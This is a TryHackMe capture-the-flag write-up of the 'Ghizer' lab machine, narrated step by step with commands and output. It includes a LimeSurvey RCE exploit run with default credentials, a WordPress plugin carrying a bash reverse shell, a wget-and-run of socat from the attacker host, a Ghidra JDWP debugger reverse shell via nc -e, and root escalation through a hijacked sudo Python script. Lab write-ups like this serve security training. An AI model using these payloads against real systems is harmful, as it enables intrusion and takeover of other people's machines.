# Ghizer

## Introduction

Welcome to my another writeup! In this TryHackMe [Ghizer](https://tryhackme.com/room/ghizerctf) room, you'll learn: LimeSurvey Remote Code Execution(RCE), exploiting WordPress, Ghidra Remote Code Execution(RCE) via JDWP debug port, and more! Without further ado, let's dive in.

## Background

> lucrecia has installed multiple web applications on the server.

> Difficulty: Medium

- Overall difficulty for me: Medium
   - Initial foothold: Easy
   - Privilege escalation: Medium

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# export RHOSTS=10.10.160.234
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT      STATE SERVICE    REASON         VERSION
21/tcp    open  ftp?       syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe: 
|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
|     Please login with USER and PASS.
|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: LimeSurvey http://www.limesurvey.org
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-favicon: Unknown favicon MD5: B55AD3F0C0A029568074402CE92ACA23
|_http-title:         LimeSurvey    
443/tcp   open  ssl/http   syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-07-23T17:27:31
| Not valid after:  2030-07-21T17:27:31
| MD5:   afb1 a2b9 1183 2e49 f707 9d1a 7198 9ca3
| SHA-1: 37f1 945f 6bc4 3fad 3f0f ca8d 3788 2c17 cc25 0792
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAIIhLFTsAdpUMA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMMBnVidW50dTAeFw0yMDA3MjMxNzI3MzFaFw0zMDA3MjExNzI3MzFaMBExDzAN
| BgNVBAMMBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALm4
| +BEIDO1MIeQZQkUZfeEqegkSYi8IGF2zvpL2zpUOCjcpm9pFZwj/ZT8g/nbdhVpX
| Q0z3eWzFKRRZdthTOfCtNkZjQhJlpR+Fvc7QDUHSG+ugZL0nIuQMKaniom6OVuQg
| 3nyxPehC9eYOjovV6m3TOWVHRYMRpf54RHHwwvpHwHkJAEcg7oHwBgP/JeW3h20r
| G/Ri8FpPZs49xYArZ15te9ofw0TUigqx03RguwKLYr+/i7+UFwmzU93+ylz/PE16
| HVfEBAFGIY52wWkc5Pt3+B+T5HZqVLqAW8LNcxSuugiMkgV1r4QQlBgNpc026aZR
| EG6sF9C57EOQgyBVihECAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAXYtbViAQzTFPjlPzwItXfMsyYYkH9guFsI9l0A6/6xa6CCwklJAF1vjz
| tpHg338NRn4CXobk9Y6aopmUsNhFwlryS5YwPQ1s5ml6GHaDQ7ijG52J4Uj1J4o5
| nRlDgqXi8EM/Dl5cgwHBnQ3k/u3uoPp/H0jIfXK/jskVurNb/sT6Raj5TEgcgMMm
| 8Hzj0jqSROhDZFtU93z8OCZWBaO8u+wVj0xtdHpg+X8UQalIrASlsSNn1i50lU2p
| 0C+eASFiDrOue7gzDDO4pdYrxmG5MiRNrfKQPLv3IvT0gEgCgkulRLo//CeY1tQ9
| 7KFSteW6LSwpqHdP08faw+/nJnfnXQ==
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 5.4.2
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-title: Ghizer &#8211; Just another WordPress site
18002/tcp open  java-rmi   syn-ack ttl 63 Java RMI
| rmi-dumpregistry: 
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:44671
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
44671/tcp open  java-rmi   syn-ack ttl 63 Java RMI
45355/tcp open  tcpwrapped syn-ack ttl 63
```

According to `rustscan` result, we have 6 ports are opened:

Open Ports        | Service
------------------|------------------------
21                | FTP
80                | HTTP, Apache 2.4.18 ((Ubuntu))
443               | HTTPS, Apache 2.4.18 ((Ubuntu))
18002,44671       | Java RMI
45355             | Unknown

### FTP on Port 21

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# ftp $RHOSTS                              
Connected to 10.10.160.234.
220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)
Name (10.10.160.234:nam): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> ^D
221 Goodbye.
```

It doesn't allow anonymous login. **We need credentials.**

### HTTP on Port 80

**Add a new domain to `/etc/hosts`:** (Optional, but it's a good practice to do this.)
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# echo "$RHOSTS ghizer.thm" | tee -a /etc/hosts
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a1.png)

Found **LimeSurvey**.

**Searchsploit:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# searchsploit limesurvey   
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
LimeSurvey (PHPSurveyor 1.91+ stable) - Blind SQL Injection          | php/webapps/18508.txt
LimeSurvey (phpsurveyor) 1.49rc2 - Remote File Inclusion             | php/webapps/4156.txt
LimeSurvey 1.52 - 'language.php' Remote File Inclusion               | php/webapps/4544.txt
LimeSurvey 1.85+ - 'admin.php' Cross-Site Scripting                  | php/webapps/35787.txt
LimeSurvey 1.92+ build120620 - Multiple Vulnerabilities              | php/webapps/19330.txt
LimeSurvey 2.00+ (build 131107) - Multiple Vulnerabilities           | php/webapps/29789.txt
LimeSurvey 3.17.13 - Cross-Site Scripting                            | php/webapps/47386.txt
LimeSurvey 4.1.11 - 'File Manager' Path Traversal                    | php/webapps/48297.txt
LimeSurvey 4.1.11 - 'Permission Roles' Persistent Cross-Site Scripti | php/webapps/48523.txt
LimeSurvey 4.1.11 - 'Survey Groups' Persistent Cross-Site Scripting  | php/webapps/48289.txt
LimeSurvey 4.3.10 - 'Survey Menu' Persistent Cross-Site Scripting    | php/webapps/48762.txt
LimeSurvey 5.2.4 - Remote Code Execution (RCE) (Authenticated)       | php/webapps/50573.py
LimeSurvey < 3.16 - Remote Code Execution                            | php/webapps/46634.py
--------------------------------------------------------------------- ---------------------------------
```

Hmm... But we don't know the version...

## Initial Foothold 1 - LimeSurvey RCE

Then, I dig deeper in [LimeSurvey GitHub repository](https://github.com/LimeSurvey/LimeSurvey), I found that there is a file called `release_notes.txt` in `/docs/`:

**http://ghizer.thm/docs/release_notes.txt:**
```
Welcome to LimeSurvey v3.x!
[...]
CHANGE LOG
------------------------------------------------------

Changes from 3.15.8 (build 190130) to 3.15.9 (build 190214) January 14, 2019
[...]
```

Found it's version: `LimeSurvey 3.15.9 (build 190214)`.

Let's try the `LimeSurvey < 3.16 - Remote Code Execution` exploit, which found via `searchsploit`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# searchsploit -m 46634
```

**And it needs credentials, which we currently don't have it:**
```
# Usage: python exploit.py [URL] [USERNAME] [PASSWORD]
```

Then, I decided to dig deeper in the rabbit hole.

**In their GitHub repository, I found the default password in the admin panel:**
```php
$config['defaultuser'] = 'admin'; // This is the default username when LimeSurvey is installed
$config['defaultpass'] = 'password'; // This is the default password for the default user when LimeSurvey is installed
```

Let's try that credentials!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a2.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a3.png)

Oh!! I'm in!

Armed with this information, let's go back to the `46634.py` exploit and run it!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# python2 46634.py http://ghizer.thm admin password
[*] Logging in to LimeSurvey...
[*] Creating a new Survey...
[+] SurveyID: 252422
[*] Uploading a malicious PHAR...
[*] Sending the Payload...
[*] TCPDF Response: <strong>TCPDF ERROR: </strong>[Image] Unable to get the size of the image: phar://./upload/surveys/252422/files/malicious.jpg
[+] Pwned! :)
[+] Getting the shell...
$ whoami;hostname;id;ip a
www-data
ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:56:23:b0:c1:77 brd ff:ff:ff:ff:ff:ff
    inet 10.10.160.234/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::56:23ff:feb0:c177/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `www-data`!

**In `/var/www/html/limesurvey/application/config/config.php`, we can see there is a credentials for MySQL:**
```php
'db' => array(
			'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',
			'emulatePrepare' => true,
			'username' => 'Anny',
			'password' => '{Redacted}',
			'charset' => 'utf8mb4',
			'tablePrefix' => 'lime_',
		),
```

## Initial Foothold 2 - WordPress RCE

In HTTPS on port 443, it's a WordPress page!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a4.png)

Also, it said: `I use the plugin WPS Hide Login for hide wp-login!`

By default, WordPress login page is in `/wp-login.php`. If the WordPress has `WPS Hide Login` plugin installed, the login will changed.

> Note: There are 2 ways to find the login url. The first way requires initial foothold in LimeSuvey.

### Finding Login URL in WordPress 1 - LimeSurvey RCE -> MySQL

**Since we're already has remote access to the target machine, we can go to MySQL database and look for the value of `whl_page` in `wp_options` table.** (Source: [GreenGeeks](https://www.greengeeks.com/tutorials/use-wps-hide-login/))

**But before we do that, make sure our reverse shell is stabled:** (If you're using `pwncat-cs`, press `Ctrl + D` to switch to remote mode.)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# pwncat-cs -lp 4444

$ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.27.249",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

[04:31:20] Welcome to pwncat 🐈!                                                            __main__.py:164
[04:32:00] received connection from 10.10.160.234:60446                                          bind.py:84
[04:32:05] 10.10.160.234:60446: registered new host w/ db                                    manager.py:957
(local) pwncat$                                                                                            
(remote) www-data@ubuntu:/var/www/html/limesurvey$ whoami;hostname;id;ip a
www-data
ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:56:23:b0:c1:77 brd ff:ff:ff:ff:ff:ff
    inet 10.10.160.234/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::56:23ff:feb0:c177/64 scope link 
       valid_lft forever preferred_lft forever
```

**Found MySQL credentials for WordPress:**
```php
(remote) www-data@ubuntu:/var/www/html/wordpress$ cat wp-config.php
[...]
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', '{Redacted}' );
```

Let's login as `wordpressuser` in MySQL, and find the value of `whl_page`!

```sql
(remote) www-data@ubuntu:/var/www/html/wordpress$ mysql -uwordpressuser -p{Redacted}
[...]
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+

mysql> use wordpress;
[...]

mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

mysql> desc wp_options;
+--------------+---------------------+------+-----+---------+----------------+
| Field        | Type                | Null | Key | Default | Extra          |
+--------------+---------------------+------+-----+---------+----------------+
| option_id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| option_name  | varchar(191)        | NO   | UNI |         |                |
| option_value | longtext            | NO   |     | NULL    |                |
| autoload     | varchar(20)         | NO   | MUL | yes     |                |
+--------------+---------------------+------+-----+---------+----------------+

mysql> SELECT * FROM wp_options WHERE option_name='whl_page';
+-----------+-------------+--------------+----------+
| option_id | option_name | option_value | autoload |
+-----------+-------------+--------------+----------+
|       155 | whl_page    | devtools     | yes      |
+-----------+-------------+--------------+----------+
```

Found it! The login url is: `/devtools`

### Finding Login URL in WordPress 2 - WordPress Meta `Log in`

**If you scoll down to the bottom of the WordPress home page, you'll see there is a `Log in` url under the `Meta` header:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a5.png)

- Login URL: `/?devtools`

Armed with this information, **we can login to the WordPress admin panel with the `anny` user credentials!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a6.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a7.png)

I'm in!

Next, to get a shell, we can **add a reverse shell plugin**!

**To do so, I'll:**

- Create a PHP reverse shell and zip it:

**PHP reverse shell for WordPress plugin:**
```php
<?php 
/**
* Plugin Name: Revshell
* Author: siunam
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.27.249/443 0>&1'")
?>
```

```                                                                                                        
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# zip revshell.zip revshell.php
```

- Upload it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a8.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a9.png)

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# nc -lnvp 443
listening on [any] 443 ...
```

- Activate the plugin:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Ghizer/images/a10.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.8.27.249] from (UNKNOWN) [10.10.160.234] 37300
bash: cannot set terminal process group (1003): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/wordpress/wp-admin$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:56:23:b0:c1:77 brd ff:ff:ff:ff:ff:ff
    inet 10.10.160.234/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::56:23ff:feb0:c177/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `www-data`!

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@ubuntu:/var/www/html/wordpress/wp-admin$ wget http://10.8.27.249/socat -O /dev/shm/socat;chmod +x /dev/shm/socat;/dev/shm/socat TCP:10.8.27.249:4445 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4445
2022/10/10 05:15:09 socat[36238] N opening character device "/dev/pts/3" for reading and writing
2022/10/10 05:15:09 socat[36238] N listening on AF=2 0.0.0.0:4445
                                                                 2022/10/10 05:15:48 socat[36238] N accepting connection from AF=2 10.10.160.234:38098 on AF=2 10.8.27.249:4445
                                                                        2022/10/10 05:15:48 socat[36238] N starting data transfer loop with FDs [5,5] and [7,7]
                                                        www-data@ubuntu:/var/www/html/wordpress/wp-admin$ 
www-data@ubuntu:/var/www/html/wordpress/wp-admin$ stty rows 22 columns 107
www-data@ubuntu:/var/www/html/wordpress/wp-admin$ export TERM=xterm-256color
www-data@ubuntu:/var/www/html/wordpress/wp-admin$ ^C     
www-data@ubuntu:/var/www/html/wordpress/wp-admin$ 
```

## Privilege Escalation

### www-data to veronica

```
www-data@ubuntu:/var/www/html/wordpress/wp-admin$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
veronica:x:1000:1000:Ghi,,,:/home/veronica:/bin/bash

www-data@ubuntu:/var/www/html/wordpress/wp-admin$ ls -lah /home
[...]
drwxr-xr-x 22 veronica veronica 4.0K Oct 10 00:32 veronica

www-data@ubuntu:/var/www/html/wordpress/wp-admin$ cd /home/veronica/
```

- Found 1 user: `veronica`

**In the home directory of user `veronica`, there is a `base.py` python script which owned by `root`:**
```
www-data@ubuntu:/home/veronica$ ls -lah
[...]
-rw-r--r--  1 root     root       86 Jul 23  2020 base.py
[...]
```

**base.py:**
```py
import base64

hijackme = base64.b64encode(b'tryhackme is the best')
print(hijackme)
```

Maybe it's about python library hijacking?

**However, we can't escalate to `root` yet, as we can't execute the `base.py` in elevated permission, like SUID sticky bit, sudo permission.**

It seems like we have to escalate to `veronica` first, maybe he has sudo permission to run `base.py` as root.

In the `netstat` command output, we can see that **port 631, 3306 and 18001 is opened in localhost**.

```
www-data@ubuntu:/home/veronica$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:18001         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
[...]
```

- Port 631 is Internet Printing Protocol (IPP), properly it's not the right path to do privilege escalation
- Port 3306 is MySQL, which is we can't escalate to `veronica`
- Port 18001 is a unknown service.

**Also, in the home directory in `veronica`, it has a dircetory called `ghira_9.0`:**
```
www-data@ubuntu:/home/veronica$ ls -lah
drwxrwxrwx  9 veronica veronica 4.0K Feb 28  2019 ghidra_9.0
```

**And then I searched Ghidra exploit in `searchsploit`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# searchsploit ghidra                              
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Ghidra (Linux) 9.0.4 - .gar Arbitrary Code Execution                  | linux/local/47231.py
---------------------------------------------------------------------- ---------------------------------

┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# searchsploit -m 47231
```

There is a Ghidra RCE in version 9.0.4!

**By reading the exploit, it needs a `.gar` file:**
```py
# Line 35
parser.add_argument("file", help="Path to input export .gar file",default=1)
```

However, this exploit **requires an interaction with the Ghidra GUI.**

After I googling more about Ghidra 9.0 exploits, I found that there is a GitHub Issues says [RCE Through JDWP Debug Port](https://github.com/NationalSecurityAgency/ghidra/issues/6).

```
Remote code execution is achievable through the JDWP debug port 18001 which is opened to all interfaces when launching in debug mode.
```

Then, I also found a [YouTube demo video](https://www.youtube.com/watch?v=N3VcWIUpgfE&ab_channel=EthicalHackersClub) that showcasing this exploit.

**To exploit it, I'll:**

- Use `jdb` debugger to attach port 18001:

```
www-data@ubuntu:/home/veronica$ jdb -attach 127.0.0.1:18001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> 
```

- Set a breakpoint in `org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()`:

```
> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
```

- Wait for the breakpoint hit:

```
Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0

Log4j2-TF-4-Scheduled-1[1] 
```

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# nc -lnvp 4446
listening on [any] 4446 ...
```

- Send a reverse shell payload:

```
Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc 10.8.27.249 4446 -e /bin/bash")
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# nc -lnvp 4446
listening on [any] 4446 ...
connect to [10.8.27.249] from (UNKNOWN) [10.10.160.234] 50874
whoami;hostname;id;ip a
veronica
ubuntu
uid=1000(veronica) gid=1000(veronica) groups=1000(veronica),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:56:23:b0:c1:77 brd ff:ff:ff:ff:ff:ff
    inet 10.10.160.234/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::56:23ff:feb0:c177/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `veronica`!

**Stable shell via `socat`:**
```
/dev/shm/socat TCP:10.8.27.249:4445 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Ghizer]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4445
2022/10/10 06:10:34 socat[52558] N opening character device "/dev/pts/3" for reading and writing
2022/10/10 06:10:34 socat[52558] N listening on AF=2 0.0.0.0:4445
                                                                 2022/10/10 06:11:16 socat[52558] N accepting connection from AF=2 10.10.160.234:38118 on AF=2 10.8.27.249:4445
                                                                     2022/10/10 06:11:16 socat[52558] N starting data transfer loop with FDs [5,5] and [7,7]
                                                  veronica@ubuntu:~$ 
veronica@ubuntu:~$ stty rows 22 columns 107
veronica@ubuntu:~$ export TERM=xterm-256color
veronica@ubuntu:~$ ^C
veronica@ubuntu:~$ 
```

**user.txt:**
```
veronica@ubuntu:~$ cat /home/veronica/user.txt
THM{Redacted}
```

### veronica to root

**Sudo permission:**
```
veronica@ubuntu:~$ sudo -l
Matching Defaults entries for veronica on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User veronica may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
```

User `veronica` is able to run any command as `root`, **but it requires password, and we don't know about this.**

**However, we can run `base.py` as root without password! Also, since we're user `veronica`, we can just remove the original `base.py`, and replace our malicious python script!**

**To escalate to root, I'll:**

- Remove the original `base.py`:

```
veronica@ubuntu:~$ mv base.py base.py.bak
```

- Add a malicious python script that add SUID sticky bit to `/bin/bash`:

```
veronica@ubuntu:~$ cat << EOF > base.py
> import os
> 
> os.system('chmod +s /bin/bash')
> EOF
```

- Run the `base.py` with `sudo`:

```
veronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py

veronica@ubuntu:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash
```

- Spawn a bash shell with SUID privilege:

```
veronica@ubuntu:~$ /bin/bash -p

bash-4.3# whoami;hostname;id;ip a
root
ubuntu
uid=1000(veronica) gid=1000(veronica) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(veronica)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:56:23:b0:c1:77 brd ff:ff:ff:ff:ff:ff
    inet 10.10.160.234/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::56:23ff:feb0:c177/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
bash-4.3# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. LimeSurvey Remote Code Execution(RCE)
2. WordPress `WPS Hide Login` Plugin
3. Exploiting WordPress
4. Privilege Escalation via Ghidra RCE Through JDWP Debug Port
5. Privilege Escalation via Python Library Hijacking